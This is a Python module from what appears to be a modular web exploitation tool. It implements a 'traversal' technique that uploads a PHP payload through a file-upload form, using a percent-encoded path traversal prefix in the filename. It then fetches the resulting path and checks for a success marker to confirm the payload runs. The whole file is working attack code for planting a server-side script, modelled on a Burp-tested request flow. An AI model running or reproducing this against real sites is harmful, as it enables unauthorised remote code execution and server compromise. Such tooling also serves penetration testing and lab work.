from .base import Strategy
from core.common import build_url, marker_result
from core.models import StrategyResult


class TraversalStrategy(Strategy):
    name = "traversal"

    def run(self, session, csrf, config, logger):
        logger.info("Technique 3: path traversal filename")

        # Reuse the configured PHP payload filename and prepend the exact
        # percent-encoded traversal sequence used by the successful Burp flow.
        payload_filename = config.TRAVERSAL_FILENAME
        wire_filename = f"{config.TRAVERSAL_WIRE_PREFIX}{payload_filename}"

        verify_path = config.TRAVERSAL_VERIFY_URL
        if not verify_path:
            verify_path = f"{config.TRAVERSAL_VERIFY_BASE_URL.rstrip('/')}/{payload_filename}"

        data = {config.UPLOAD_USER_FIELD: config.UPLOAD_USERNAME}
        if csrf:
            data[config.UPLOAD_CSRF_FIELD] = csrf

        try:
            files = {
                config.UPLOAD_FILE_FIELD: (
                    wire_filename,
                    config.PHP_PAYLOAD,
                    config.TRAVERSAL_CONTENT_TYPE,
                )
            }

            logger.info(f"Traversal wire filename: {wire_filename}")
            logger.info(f"Traversal verify path: {verify_path}")

            r = session.post(
                build_url(config.TARGET, config.UPLOAD_URL),
                data=data,
                files=files,
                timeout=config.TIMEOUT,
                verify=config.VERIFY_TLS,
                allow_redirects=config.FOLLOW_REDIRECTS,
            )

            logger.info(f"Traversal upload: HTTP {r.status_code}")

            if r.status_code >= 400:
                return StrategyResult(
                    False,
                    self.name,
                    f"Upload rejected: HTTP {r.status_code}",
                    filename=wire_filename,
                )

            verify_url = build_url(config.TARGET, verify_path)
            v = session.get(
                verify_url,
                timeout=config.TIMEOUT,
                verify=config.VERIFY_TLS,
                allow_redirects=config.FOLLOW_REDIRECTS,
            )

            return marker_result(
                self.name,
                v,
                verify_url,
                config.SUCCESS_MARKER,
                config.END_MARKER,
                wire_filename,
            )

        except Exception as exc:
            return StrategyResult(False, self.name, str(exc), filename=wire_filename)
